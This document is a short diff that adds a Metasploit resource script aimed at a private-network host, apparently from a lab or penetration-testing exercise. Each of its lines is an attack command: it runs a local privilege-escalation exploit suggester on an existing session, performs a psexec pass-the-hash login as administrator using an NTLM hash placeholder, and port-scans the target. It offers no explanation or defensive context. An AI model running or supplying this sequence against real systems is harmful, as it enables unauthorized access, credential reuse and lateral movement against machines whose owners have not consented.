@@ -1,0 +1,14 @@
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.121.135
+set SMBUser administrator
+set SMBPass <NTLM_HASH>
+run
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.121.135
+set PORTS 1-1000
+run
